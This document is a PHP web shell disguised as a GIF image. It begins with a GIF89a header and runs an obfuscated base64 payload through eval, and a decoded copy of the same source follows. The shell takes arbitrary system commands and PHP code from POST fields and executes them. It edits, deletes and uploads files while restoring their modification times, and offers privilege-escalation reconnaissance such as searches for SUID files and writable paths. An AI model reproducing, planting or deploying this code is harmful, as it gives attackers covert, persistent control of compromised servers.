GIF89a1\n<?php
eval(base64_decode("aW5pX3NldCgnb3V0cHV0X2J1ZmZlcmluZycsMCk7DQppZihAc2V0X3RpbWVfbGltaXQoMCkgfHwgaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywgMCkpICRsaW1pdCA9ICdub3QgbGltaXRlZCc7DQplbHNlICRsaW1pdCA9IGdldF9jZmdfdmFyKCdtYXhfZXhlY3V0aW9uX3RpbWUnKTsNCg0KaWYoaXNzZXQoJEhUVFBfU0VSVkVSX1ZBUlMpICYmICFpc3NldCgkX1NFUlZFUikpew0KJF9QT1NUID0gJiRIVFRQX1BPU1RfVkFSUzsNCiRfR0VUID0gJiRIVFRQX0dFVF9WQVJTOw0KJF9TRVJWRVIgPSAmJEhUVFBfU0VSVkVSX1ZBUlM7DQp9DQoNCmlmKEBnZXRfbWFnaWNfcXVvdGVzX2dwYygpKXsNCmZvcmVhY2goJF9QT1NUIGFzICRrPT4kdikgJF9QT1NUWyRrXSA9IHN0cmlwc2xhc2hlcygkdik7DQpmb3JlYWNoKCRfU0VSVkVSIGFzICRrPT4kdikgJF9TRVJWRVJbJGtdID0gc3RyaXBzbGFzaGVzKCR2KTsNCn0NCg0KZnVuY3Rpb24gZXhlY3V0ZSgkYyl7DQppZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSl7DQpAZXhlYygkYywgJG91dCk7DQpyZXR1cm4gQGltcGxvZGUoIlxuIiwgJG91dCk7DQp9ZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKXsNCiRvdXQgPSBAc2hlbGxfZXhlYygkYyk7DQpyZXR1cm4gJG91dDsNCn1lbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSl7DQpAb2Jfc3RhcnQoKTsNCkBzeXN0ZW0oJGMsICRyZXQpOw0KJG91dCA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCnJldHVybiAkb3V0Ow0KfWVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQG9iX3N0YXJ0KCk7DQpAcGFzc3RocnUoJGMsICRyZXQpOw0KJG91dCA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCnJldHVybiAkb3V0Ow0KfWVsc2V7DQpyZXR1cm4gRkFMU0U7DQp9DQp9DQoNCmZ1bmN0aW9uIHJlYWQoJGYpew0KJHN0ciA9IEBmaWxlKCRmKTsNCmlmKCRzdHIpew0KJG91dCA9IGltcGxvZGUoJycsICRzdHIpOw0KfWVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ2N1cmxfdmVyc2lvbicpKXsNCkBvYl9zdGFydCgpOw0KJGggPSBAY3VybF9pbml0KCdmaWxlOi8nLicvJy4kZik7DQpAY3VybF9leGVjKCRoKTsNCiRvdXQgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7DQpAb2JfZW5kX2NsZWFuKCk7DQp9ZWxzZXsNCiRvdXQgPSAnQ291bGQgbm90IHJlYWQgZmlsZSEnOw0KfQ0KcmV0dXJuIGh0bWxzcGVjaWFsY2hhcnMoJG91dCk7DQp9DQoNCmZ1bmN0aW9uIHdyaXRlKCRmLCAkYyl7DQokdCA9IGZpbGVtdGltZSgkZik7DQokZnAgPSBAZm9wZW4oJGYsICd3Jyk7DQppZigkZnApew0KZndyaXRlKCRmcCwgJGMpOw0KZmNsb3NlKCRmcCk7DQokb3V0ID0gJ0ZpbGUgc2F2ZWQuJy4iXG4iOw0KaWYoJHQgJiYgdG91Y2goJGYsICR0KSl7DQokb3V0IC49ICdMYXN0IG1vZGlmaWNhdGlvbiB0aW1lIGNoYW5nZWQuJzsNCn1lbHNlew0KJG91dCAuPSAnQ291bGQgbm90IGNoYW5nZSBsYXN0IG1vZGlmaWNhdGlvbiB0aW1lISc7DQp9DQp9ZWxzZXsNCiRvdXQgPSAnU2F2aW5nIGZhaWxlZCEnOw0KfQ0KcmV0dXJuICRvdXQ7DQp9DQoNCmZ1bmN0aW9uIGZpbGVfc2l6ZSgkZil7DQokc2l6ZSA9IGZpbGVzaXplKCRmKTsNCmlmKCRzaXplIDwgMTAyNCkgJHNpemUgPSAkc2l6ZS4nJm5ic3A7Yic7DQplbHNlaWYoJHNpemUgPCAxMDQ4NTc2KSAkc2l6ZSA9IHJvdW5kKCRzaXplLzEwMjQqMTAwKS8xMDAgLiAnJm5ic3A7S2InOw0KZWxzZWlmKCRzaXplIDwgMTA3Mzc0MTgyNCkgJHNpemU9cm91bmQoJHNpemUvMTA0ODU3NioxMDApLzEwMCAuICcmbmJzcDtNYic7DQpyZXR1cm4gJHNpemU7DQp9DQoNCmlmKCFmdW5jdGlvbl9leGlzdHMoJ25hdGNhc2Vzb3J0Jykpew0KZnVuY3Rpb24gbmF0Y2FzZXNvcnQoJGFycil7DQpyZXR1cm4gc29ydCgkYXJyKTsNCn0NCn0NCg0KaWYoIWVtcHR5KCRfUE9TVFsnZGlyJ10pKXsNCiRkaXIgPSAkX1BPU1RbJ2RpciddOw0KaWYoIUBjaGRpcigkZGlyKSkgJG91dCA9ICdjaGRpcigpIGZhaWxsZWQhJzsNCn0NCiRkaXIgPSBnZXRjd2QoKTsNCg0KDQoNCihzdHJsZW4oJGRpcikgPiAxICYmICRkaXJbMV0gPT0gJzonKSA/ICRvc190eXBlID0gJ3dpbicgOiAkb3NfdHlwZSA9ICduaXgnOw0KDQppZighJG9zX25hbWUgPSBAcGhwX3VuYW1lKCkpew0KaWYoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF91bmFtZScpKXsNCiRvc19uYW1lID0gcG9zaXhfdW5hbWUoKTsNCn1lbHNlaWYoJG9zX25hbWUgIT0gZ2V0ZW52KCdPUycpKXsNCiRvc19uYW1lID0gJyc7DQp9DQp9DQoNCmlmKGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0cHd1aWQnKSl7DQokZGF0YSA9IHBvc2l4X2dldHB3dWlkKHBvc2l4X2dldHVpZCgpKTsNCiR1c2VyID0gJGRhdGFbJ25hbWUnXS4nIHVpZCgnLiRkYXRhWyd1aWQnXS4nKSBnaWQoJy4kZGF0YVsnZ2lkJ10uJyknOw0KfWVsc2V7DQokdXNlciA9ICcnOw0KfQ0KDQokc2FmZV9tb2RlID0gZ2V0X2NmZ192YXIoJ3NhZmVfbW9kZScpOw0KJHNhZmVfbW9kZSA/ICRzYWZlID0gJ29uJyA6ICRzYWZlID0gJ29mZic7DQoNCmV4ZWN1dGUoJ2VjaG8gc3NwcycpID8gJGV4ZWN1dGUgPSAnb24nIDogJGV4ZWN1dGUgPSAnb2ZmJzsNCg0KDQoNCg0KJHNlcnZlciA9IGdldGVudignU0VSVkVSX1NPRlRXQVJFJyk7DQppZighJHNlcnZlcikgJHNlcnZlciA9ICctLS0nOw0KDQoNCg0KJG91dCA9ICcnOw0KJHRhaWwgPSAnJzsNCiRhbGlhc2VzID0gJyc7DQppZighJHNhZmVfbW9kZSl7DQppZigkb3NfdHlwZSA9PSAnbml4Jyl7DQokb3MgLj0gZXhlY3V0ZSgnc3lzY3RsIC1uIGtlcm4ub3N0eXBlJyk7DQokb3MgLj0gZXhlY3V0ZSgnc3lzY3RsIC1uIGtlcm4ub3NyZWxlYXNlJyk7DQokb3MgLj0gZXhlY3V0ZSgnc3lzY3RsIC1uIGtlcm5lbC5vc3R5cGUnKTsNCiRvcyAuPSBleGVjdXRlKCdzeXNjdGwgLW4ga2VybmVsLm9zcmVsZWFzZScpOw0KaWYoZW1wdHkoJHVzZXIpKSAkdXNlciA9IGV4ZWN1dGUoJ2lkJyk7DQokYWxpYXNlcyA9IGFycmF5KA0KJycgPT4gJycsDQonZmluZCBzdWlkIGZpbGVzJz0+J2ZpbmQgLyAtdHlwZSBmIC1wZXJtIC0wNDAwMCAtbHMnLA0KJ2ZpbmQgc2dpZCBmaWxlcyc9PidmaW5kIC8gLXR5cGUgZiAtcGVybSAtMDIwMDAgLWxzJywNCidmaW5kIGFsbCB3cml0YWJsZSBmaWxlcyBpbiBjdXJyZW50IGRpcic9PidmaW5kIC4gLXR5cGUgZiAtcGVybSAtMiAtbHMnLA0KJ2ZpbmQgYWxsIHdyaXRhYmxlIGRpcmVjdG9yaWVzIGluIGN1cnJlbnQgZGlyJz0+J2ZpbmQgLiAtdHlwZSBkIC1wZXJtIC0yIC1scycsDQonZmluZCBhbGwgd3JpdGFibGUgZGlyZWN0b3JpZXMgYW5kIGZpbGVzIGluIGN1cnJlbnQgZGlyJz0+J2ZpbmQgLiAtcGVybSAtMiAtbHMnLA0KJ3Nob3cgb3BlbmVkIHBvcnRzJz0+J25ldHN0YXQgLWFuIHwgZ3JlcCAtaSBsaXN0ZW4nLA0KKTsNCn1lbHNlew0KJG9zX25hbWUgLj0gZXhlY3V0ZSgndmVyJyk7DQokdXNlciAuPSBleGVjdXRlKCdlY2hvICV1c2VybmFtZSUnKTsNCiRhbGlhc2VzID0gYXJyYXkoDQonJyA9PiAnJywNCidzaG93IHJ1bmluZyBzZXJ2aWNlcycgPT4gJ25ldCBzdGFydCcsDQonc2hvdyBwcm9jZXNzIGxpc3QnID0+ICd0YXNrbGlzdCcNCik7DQp9DQp9DQoNCg0KDQppZighZW1wdHkoJF9QT1NUWydjbWQnXSkpew0KJG91dCA9IGV4ZWN1dGUoJF9QT1NUWydjbWQnXSk7DQp9DQoNCmVsc2VpZighZW1wdHkoJF9QT1NUWydwaHAnXSkpew0Kb2Jfc3RhcnQoKTsNCmV2YWwoJF9QT1NUWydwaHAnXSk7DQokb3V0ID0gb2JfZ2V0X2NvbnRlbnRzKCk7DQpvYl9lbmRfY2xlYW4oKTsNCn0NCg0KZWxzZWlmKCFlbXB0eSgkX1BPU1RbJ2VkaXQnXSkpew0KJGZpbGUgPSAkX1BPU1RbJ2VkaXQnXTsNCiRvdXQgPSByZWFkKCRmaWxlKTsNCiR0YWlsID0gJzxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRpciB2YWx1ZT0iJy4kZGlyLiciPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWVmaWxlIHZhbHVlPSInLiRmaWxlLiciPjxicj48aW5wdXQgdHlwZT1zdWJtaXQ+JzsNCn0NCg0KZWxzZWlmKCFlbXB0eSgkX1BPU1RbJ3NhdmUnXSkpew0KJG91dCA9IHdyaXRlKCRfUE9TVFsnZWZpbGUnXSwgJF9QT1NUWydzYXZlJ10pOw0KfQ0KDQplbHNlaWYoIWVtcHR5KCRfUE9TVFsncmVtb3ZlJ10pKXsNCiRvYmogPSAkX1BPU1RbJ3JlbW92ZSddOw0KQGlzX2Rpcigkb2JqKSA/ICRyZXMgPSBAcm1kaXIoJG9iaikgOiAkcmVzID0gQHVubGluaygkb2JqKTsNCiRyZXMgPyAkb3V0ID0gJ1JlbW92ZWQgc3VjY2Vzc2Z1bGx5JyA6ICRvdXQgPSAnUmVtb3ZpbmcgZmFpbGVkISc7DQp9DQoNCmVsc2VpZighZW1wdHkoJF9QT1NUWyduZXdkaXInXSkpew0KQG1rZGlyKCRfUE9TVFsnbmV3ZGlyJ10pID8gJG91dCA9ICdEaXJlY3RvcnkgY3JlYXRlZC4nIDogJG91dCA9ICdDb3VsZCBub3QgY3JlYXRlIGRpcmVjdG9yeSEnOw0KfQ0KDQplbHNlaWYoIWVtcHR5KCRfUE9TVFsnbmV3ZmlsZSddKSl7DQpAdG91Y2goJF9QT1NUWyduZXdmaWxlJ10pID8gJG91dCA9ICdGaWxlIGNyZWF0ZWQuJyA6ICRvdXQgPSAnQ291bGQgbm90IGNyZWF0ZSBmaWxlISc7DQp9DQoNCmVsc2VpZighZW1wdHkoJF9QT1NUWydhbGlhcyddKSl7DQokb3V0ID0gZXhlY3V0ZSgkX1BPU1RbJ2FsaWFzJ10pOw0KfQ0KDQplbHNlaWYoIWVtcHR5KCRfRklMRVNbJ3VmaWxlJ11bJ3RtcF9uYW1lJ10pKXsNCmlmKCFpc191cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VmaWxlJ11bJ3RtcF9uYW1lJ10pIHx8IEAhY29weSgkX0ZJTEVTWyd1ZmlsZSddWyd0bXBfbmFtZSddLCRkaXIuY2hyKDQ3KS4kX0ZJTEVTWyd1ZmlsZSddWyduYW1lJ10pKSAkb3V0ID0gJ0NvdWxkIG5vdCB1cGxvYWQgZmlsZSc7DQplbHNlICRvdXQgPSAnVXBsb2FkZWQgc3VjY2Vzc2Z1bGx5Lic7DQp9DQoNCnByaW50PDw8aGVyZQ0KPHN0eWxlPg0KdGFibGUge2ZvbnQ6OXB0IFRhaG9tYTtib3JkZXItY29sb3I6d2hpdGV9DQppbnB1dCxzZWxlY3QsZmlsZSB7YmFja2dyb3VuZC1jb2xvcjojZWVlZWVlfQ0KdGV4dGFyZWEge2JhY2tncm91bmQtY29sb3I6I2YyZjJmMn0NCjwvc3R5bGU+DQo8YnI+DQo8Y2VudGVyPg0KPHRhYmxlIGNlbGxwYWRkaW5nPTEgY2VsbHNwYWNpbmc9MCBib3JkZXI9MSB3aWR0aD02NTAgYmdjb2xvcj1zaWx2ZXI+DQo8dHI+DQo8dGQ+DQo8Zm9ybSBtZXRob2Q9cG9zdD4NCjx0YWJsZSBjZWxscGFkZGluZz0xIGNlbGxzcGFjaW5nPTAgYm9yZGVyPTEgd2lkdGg9NjUwPg0KaGVyZTsNCmlmKCEkc2FmZV9tb2RlKSBwcmludDw8PGhlcmUNCjx0cj4NCjx0ZD4NCmNtZA0KPC90ZD4NCjx0ZCBjb2xzcGFuPTg+DQo8aW5wdXQgdHlwZT10ZXh0IG5hbWU9Y21kIHNpemU9OTc+DQo8L3RkPg0KPC90cj4NCmhlcmU7DQpwcmludDw8PGhlcmUNCjx0cj4NCjx0ZD4NCnBocA0KPC90ZD4NCjx0ZCBjb2xzcGFuPTg+DQo8aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGhwIHNpemU9OTc+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD4NCmFjdGlvbnMNCjwvdGQ+DQo8dGQ+DQplZGl0DQo8L3RkPg0KPHRkPg0KPGlucHV0IHR5cGU9dGV4dCBuYW1lPWVkaXQgc2l6ZT0xND4NCjwvdGQ+DQo8dGQ+DQpyZW1vdmUNCjwvdGQ+DQo8dGQ+DQo8aW5wdXQgdHlwZT10ZXh0IG5hbWU9cmVtb3ZlIHNpemU9MTQ+DQo8L3RkPg0KPHRkPg0KbmV3X2Rpcg0KPC90ZD4NCjx0ZD4NCjxpbnB1dCB0eXBlPXRleHQgbmFtZT1uZXdkaXIgc2l6ZT0xND4NCjwvdGQ+DQo8dGQ+DQpuZXdfZmlsZQ0KPC90ZD4NCjx0ZD4NCjxpbnB1dCB0eXBlPXRleHQgbmFtZT1uZXdmaWxlIHNpemU9MTU+DQo8L3RkPg0KPC90cj4NCmhlcmU7DQppZigkYWxpYXNlcyl7DQpwcmludDw8PGhlcmUNCjx0cj4NCjx0ZD4NCmFsaWFzZXMNCjwvdGQ+DQo8dGQgY29sc3Bhbj04Pg0KPHNlbGVjdCBuYW1lPWFsaWFzPg0KaGVyZTsNCmZvcmVhY2goJGFsaWFzZXMgYXMgJGsgPT4gJHYpew0KcHJpbnQgJzxvcHRpb24gdmFsdWU9IicuJHYuJyI+Jy4kay4nPC9vcHRpb24+JzsNCn0NCnByaW50PDw8aGVyZQ0KDQoNCjwvc2VsZWN0Pg0KPGlucHV0IHR5cGU9c3VibWl0Pg0KPC90ZD4NCjwvdHI+DQpoZXJlOw0KfQ0KcHJpbnQ8PDxoZXJlDQo8dHI+DQo8dGQ+DQpkaXINCjwvdGQ+DQo8dGQgY29sc3Bhbj04Pg0KPGlucHV0IHR5cGU9dGV4dCB2YWx1ZT0ieyRkaXJ9IiBuYW1lPWRpciBzaXplPTk3Pg0KPC90ZD4NCjwvdHI+DQo8L2Zvcm0+DQo8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+DQo8dHI+DQo8dGQ+DQp1cGxvYWQNCjwvdGQ+DQo8dGQgY29sc3Bhbj04Pg0KPGlucHV0IHR5cGU9ZmlsZSBuYW1lPXVmaWxlIHNpemU9NzY+DQo8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kaXIgdmFsdWU9InskZGlyfSI+DQo8aW5wdXQgdHlwZT1zdWJtaXQ+DQo8L3RkPg0KPC90cj4NCjwvZm9ybT4NCjwvdGFibGU+DQoNCg0KDQo8dGFibGUgY2VsbHBhZGRpbmc9MCBjZWxsc3BhY2luZz0wIGJvcmRlcj0xIHdpZHRoPTY1MD4NCjxmb3JtIG1ldGhvZD1wb3N0Pg0KPHRyIHZhbGlnbj10b3A+DQo8dGQgd2lkdGg9NzAlIGJnY29sb3I9I2RkZGRkZD4NCjxiPk9TOjwvYj4geyRvc19uYW1lfTxicj4NCjxiPlVzZXI6PC9iPiB7JHVzZXJ9PGJyPg0KPGI+U2VydmVyOjwvYj4geyRzZXJ2ZXJ9PGJyPg0KPGI+c2FmZV9tb2RlOjwvYj4geyRzYWZlfSA8Yj5leGVjdXRlOjwvYj4geyRleGVjdXRlfSA8Yj5tYXhfZXhlY3V0aW9uX3RpbWU6PC9iPiB7JGxpbWl0fQ0KPC90ZD4NCjx0ZCByb3dzcGFuPTIgYmdjb2xvcj0jZGRkZGRkPg0KPGNlbnRlcj5+OihleHBsMHJlcik6fjwvY2VudGVyPg0KaGVyZTsNCg0KDQoNCmlmKCRkcCA9IEBvcGVuRGlyKCRkaXIpKXsNCiRjT2JqID0gcmVhZERpcigkZHApOw0Kd2hpbGUoJGNPYmopew0KaWYoQGlzX2RpcigkY09iaikpICR0aGVEaXJzW10gPSAkY09iajsNCmVsc2VpZihAaXNfZmlsZSgkY09iaikpICR0aGVGaWxlc1tdID0gJGNPYmo7DQokY09iaiA9IHJlYWREaXIoJGRwKTsNCn0NCmNsb3NlZGlyKCRkcCk7DQp9DQoNCmlmKCFlbXB0eSgkdGhlRGlycykpew0KbmF0Y2FzZXNvcnQoJHRoZURpcnMpOw0KaWYoJG9zX3R5cGUgPT0gJ25peCcpew0KZm9yZWFjaCgkdGhlRGlycyBhcyAkY0Rpcil7DQokY29sb3I9J2JsYWNrJzsNCmlmKGlzX3dyaXRlYWJsZSgkY0Rpcikpew0KJGNvbG9yPSdyZWQnOw0KfWVsc2VpZihpc19yZWFkYWJsZSgkY0Rpcikpew0KJGNvbG9yPSdibHVlJzsNCn0NCnByaW50ICI8Zm9udCBjb2xvcj0iLiRjb2xvci4iPiZsdDsiLiRjRGlyLiImZ3Q7PC9mb250Pjxicj4iOw0KfQ0KfWVsc2V7DQpmb3JlYWNoKCR0aGVEaXJzIGFzICRjRGlyKXsNCiR0bXAgPSAkY0Rpci4nLy5zc3BzX3RtcCc7DQppZihAdG91Y2goJHRtcCkpew0KJGNvbG9yPSdyZWQnOw0KdW5saW5rKCR0bXApOw0KfWVsc2VpZihvcGVuZGlyKCRjRGlyKSl7DQpjbG9zZWRpcigpOw0KJGNvbG9yPSdibHVlJzsNCn1lbHNlew0KJGNvbG9yPSdibGFjayc7DQp9DQpwcmludCAiPGZvbnQgY29sb3I9Ii4kY29sb3IuIj4mbHQ7Ii4kY0Rpci4iJmd0OzwvZm9udD48YnI+IjsNCn0NCn0NCn0gZWxzZSBwcmludCAnPGJyPm9wZW5fYmFzZWRpciByZXN0cmljdGlvbiBpbiBlZmZlY3QuIEFsbG93ZWQgcGF0aCBpcyAnLmdldF9jZmdfdmFyKCdvcGVuX2Jhc2VkaXInKTsNCg0KcHJpbnQgJzxicj4nOw0KDQppZighZW1wdHkoJHRoZUZpbGVzKSl7DQpuYXRjYXNlc29ydCgkdGhlRmlsZXMpOw0KcHJpbnQgJzx0YWJsZSB3aWR0aD0xMDAlIGJvcmRlcj0wIGNlbGxwYWRkaW5nPTAgY2VsbHNwYWNpbmc9MiBzdHlsZT0iZm9udDo4cHQgVGFob21hOyI+JzsNCmZvcmVhY2goJHRoZUZpbGVzIGFzICRjRmlsZSl7DQokc2l6ZSA9IGZpbGVfc2l6ZSgkY0ZpbGUpOw0KaWYoJGZwID0gQGZvcGVuKCRjRmlsZSwgJ2EnKSkgJGNvbG9yID0gJ3JlZCc7DQplbHNlaWYoJGZwID0gQGZvcGVuKCRjRmlsZSwgJ3InKSkgJGNvbG9yPSdibHVlJzsNCmVsc2UgJGNvbG9yID0gJ2JsYWNrJzsNCkBmY2xvc2UoJGZwKTsNCnByaW50ICc8dHI+PHRkIHdpZHRoPTEwMCU+PGZvbnQgY29sb3I9Jy4kY29sb3IuJz4nLiRjRmlsZS4nPC9mb250PjwvdGQ+PHRkIGFsaWduPWxlZnQ+Jy4kc2l6ZS4nPC90cj4nOw0KfQ0KcHJpbnQgJzwvdGFibGU+JzsNCn0NCg0KcHJpbnQ8PDxoZXJlDQo8L3RkPg0KPC90cj4NCjx0ciB2YWxpZ249dG9wPg0KPHRkIGFsaWduPWNlbnRlcj4NCjxmb3JtIG1ldGhvZD1wb3N0Pg0KfjoocmVzdWx0cyk6fg0KPHRleHRhcmVhIG5hbWU9c2F2ZSBjb2xzPTU1IHJvd3M9MTU+eyRvdXR9PC90ZXh0YXJlYT4NCnskdGFpbH0NCjwvZm9ybT4NCjwvdGQ+DQo8L3RyPg0KDQo8L3RhYmxlPg0KPC9mb3JtPg0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KaGVyZTsNCmRpZTsNCg0K"));?>
____decode___
<?php
ini_set('output_buffering',0);
if(@set_time_limit(0) || ini_set('max_execution_time', 0)) $limit = 'not limited';
else $limit = get_cfg_var('max_execution_time');

if(isset($HTTP_SERVER_VARS) && !isset($_SERVER)){
$_POST = &$HTTP_POST_VARS;
$_GET = &$HTTP_GET_VARS;
$_SERVER = &$HTTP_SERVER_VARS;
}

if(@get_magic_quotes_gpc()){
foreach($_POST as $k=>$v) $_POST[$k] = stripslashes($v);
foreach($_SERVER as $k=>$v) $_SERVER[$k] = stripslashes($v);
}

function execute($c){
if(function_exists('exec')){
@exec($c, $out);
return @implode("\n", $out);
}elseif(function_exists('shell_exec')){
$out = @shell_exec($c);
return $out;
}elseif(function_exists('system')){
@ob_start();
@system($c, $ret);
$out = @ob_get_contents();
@ob_end_clean();
return $out;
}elseif(function_exists('passthru')){
@ob_start();
@passthru($c, $ret);
$out = @ob_get_contents();
@ob_end_clean();
return $out;
}else{
return FALSE;
}
}

function read($f){
$str = @file($f);
if($str){
$out = implode('', $str);
}elseif(function_exists('curl_version')){
@ob_start();
$h = @curl_init('file:/'.'/'.$f);
@curl_exec($h);
$out = @ob_get_contents();
@ob_end_clean();
}else{
$out = 'Could not read file!';
}
return htmlspecialchars($out);
}

function write($f, $c){
$t = filemtime($f);
$fp = @fopen($f, 'w');
if($fp){
fwrite($fp, $c);
fclose($fp);
$out = 'File saved.'."\n";
if($t && touch($f, $t)){
$out .= 'Last modification time changed.';
}else{
$out .= 'Could not change last modification time!';
}
}else{
$out = 'Saving failed!';
}
return $out;
}

function file_size($f){
$size = filesize($f);
if($size < 1024) $size = $size.'&nbsp;b';
elseif($size < 1048576) $size = round($size/1024*100)/100 . '&nbsp;Kb';
elseif($size < 1073741824) $size=round($size/1048576*100)/100 . '&nbsp;Mb';
return $size;
}

if(!function_exists('natcasesort')){
function natcasesort($arr){
return sort($arr);
}
}

if(!empty($_POST['dir'])){
$dir = $_POST['dir'];
if(!@chdir($dir)) $out = 'chdir() failled!';
}
$dir = getcwd();



(strlen($dir) > 1 && $dir[1] == ':') ? $os_type = 'win' : $os_type = 'nix';

if(!$os_name = @php_uname()){
if(function_exists('posix_uname')){
$os_name = posix_uname();
}elseif($os_name != getenv('OS')){
$os_name = '';
}
}

if(function_exists('posix_getpwuid')){
$data = posix_getpwuid(posix_getuid());
$user = $data['name'].' uid('.$data['uid'].') gid('.$data['gid'].')';
}else{
$user = '';
}

$safe_mode = get_cfg_var('safe_mode');
$safe_mode ? $safe = 'on' : $safe = 'off';

execute('echo ssps') ? $execute = 'on' : $execute = 'off';




$server = getenv('SERVER_SOFTWARE');
if(!$server) $server = '---';



$out = '';
$tail = '';
$aliases = '';
if(!$safe_mode){
if($os_type == 'nix'){
$os .= execute('sysctl -n kern.ostype');
$os .= execute('sysctl -n kern.osrelease');
$os .= execute('sysctl -n kernel.ostype');
$os .= execute('sysctl -n kernel.osrelease');
if(empty($user)) $user = execute('id');
$aliases = array(
'' => '',
'find suid files'=>'find / -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'show opened ports'=>'netstat -an | grep -i listen',
);
}else{
$os_name .= execute('ver');
$user .= execute('echo %username%');
$aliases = array(
'' => '',
'show runing services' => 'net start',
'show process list' => 'tasklist'
);
}
}



if(!empty($_POST['cmd'])){
$out = execute($_POST['cmd']);
}

elseif(!empty($_POST['php'])){
ob_start();
eval($_POST['php']);
$out = ob_get_contents();
ob_end_clean();
}

elseif(!empty($_POST['edit'])){
$file = $_POST['edit'];
$out = read($file);
$tail = '<input type=hidden name=dir value="'.$dir.'"><input type=hidden name=efile value="'.$file.'"><br><input type=submit>';
}

elseif(!empty($_POST['save'])){
$out = write($_POST['efile'], $_POST['save']);
}

elseif(!empty($_POST['remove'])){
$obj = $_POST['remove'];
@is_dir($obj) ? $res = @rmdir($obj) : $res = @unlink($obj);
$res ? $out = 'Removed successfully' : $out = 'Removing failed!';
}

elseif(!empty($_POST['newdir'])){
@mkdir($_POST['newdir']) ? $out = 'Directory created.' : $out = 'Could not create directory!';
}

elseif(!empty($_POST['newfile'])){
@touch($_POST['newfile']) ? $out = 'File created.' : $out = 'Could not create file!';
}

elseif(!empty($_POST['alias'])){
$out = execute($_POST['alias']);
}

elseif(!empty($_FILES['ufile']['tmp_name'])){
if(!is_uploaded_file($_FILES['ufile']['tmp_name']) || @!copy($_FILES['ufile']['tmp_name'],$dir.chr(47).$_FILES['ufile']['name'])) $out = 'Could not upload file';
else $out = 'Uploaded successfully.';
}

print<<<here
<style>
table {font:9pt Tahoma;border-color:white}
input,select,file {background-color:#eeeeee}
textarea {background-color:#f2f2f2}
</style>
<br>
<center>
<table cellpadding=1 cellspacing=0 border=1 width=650 bgcolor=silver>
<tr>
<td>
<form method=post>
<table cellpadding=1 cellspacing=0 border=1 width=650>
here;
if(!$safe_mode) print<<<here
<tr>
<td>
cmd
</td>
<td colspan=8>
<input type=text name=cmd size=97>
</td>
</tr>
here;
print<<<here
<tr>
<td>
php
</td>
<td colspan=8>
<input type=text name=php size=97>
</td>
</tr>
<tr>
<td>
actions
</td>
<td>
edit
</td>
<td>
<input type=text name=edit size=14>
</td>
<td>
remove
</td>
<td>
<input type=text name=remove size=14>
</td>
<td>
new_dir
</td>
<td>
<input type=text name=newdir size=14>
</td>
<td>
new_file
</td>
<td>
<input type=text name=newfile size=15>
</td>
</tr>
here;
if($aliases){
print<<<here
<tr>
<td>
aliases
</td>
<td colspan=8>
<select name=alias>
here;
foreach($aliases as $k => $v){
print '<option value="'.$v.'">'.$k.'</option>';
}
print<<<here


</select>
<input type=submit>
</td>
</tr>
here;
}
print<<<here
<tr>
<td>
dir
</td>
<td colspan=8>
<input type=text value="{$dir}" name=dir size=97>
</td>
</tr>
</form>
<form method=post enctype=multipart/form-data>
<tr>
<td>
upload
</td>
<td colspan=8>
<input type=file name=ufile size=76>
<input type=hidden name=dir value="{$dir}">
<input type=submit>
</td>
</tr>
</form>
</table>



<table cellpadding=0 cellspacing=0 border=1 width=650>
<form method=post>
<tr valign=top>
<td width=70% bgcolor=#dddddd>
<b>OS:</b> {$os_name}<br>
<b>User:</b> {$user}<br>
<b>Server:</b> {$server}<br>
<b>safe_mode:</b> {$safe} <b>execute:</b> {$execute} <b>max_execution_time:</b> {$limit}
</td>
<td rowspan=2 bgcolor=#dddddd>
<center>~:(expl0rer):~</center>
here;



if($dp = @openDir($dir)){
$cObj = readDir($dp);
while($cObj){
if(@is_dir($cObj)) $theDirs[] = $cObj;
elseif(@is_file($cObj)) $theFiles[] = $cObj;
$cObj = readDir($dp);
}
closedir($dp);
}

if(!empty($theDirs)){
natcasesort($theDirs);
if($os_type == 'nix'){
foreach($theDirs as $cDir){
$color='black';
if(is_writeable($cDir)){
$color='red';
}elseif(is_readable($cDir)){
$color='blue';
}
print "<font color=".$color.">&lt;".$cDir."&gt;</font><br>";
}
}else{
foreach($theDirs as $cDir){
$tmp = $cDir.'/.ssps_tmp';
if(@touch($tmp)){
$color='red';
unlink($tmp);
}elseif(opendir($cDir)){
closedir();
$color='blue';
}else{
$color='black';
}
print "<font color=".$color.">&lt;".$cDir."&gt;</font><br>";
}
}
} else print '<br>open_basedir restriction in effect. Allowed path is '.get_cfg_var('open_basedir');

print '<br>';

if(!empty($theFiles)){
natcasesort($theFiles);
print '<table width=100% border=0 cellpadding=0 cellspacing=2 style="font:8pt Tahoma;">';
foreach($theFiles as $cFile){
$size = file_size($cFile);
if($fp = @fopen($cFile, 'a')) $color = 'red';
elseif($fp = @fopen($cFile, 'r')) $color='blue';
else $color = 'black';
@fclose($fp);
print '<tr><td width=100%><font color='.$color.'>'.$cFile.'</font></td><td align=left>'.$size.'</tr>';
}
print '</table>';
}

print<<<here
</td>
</tr>
<tr valign=top>
<td align=center>
<form method=post>
~:(results):~
<textarea name=save cols=55 rows=15>{$out}</textarea>
{$tail}
</form>
</td>
</tr>

</table>
</form>
</td>
</tr>
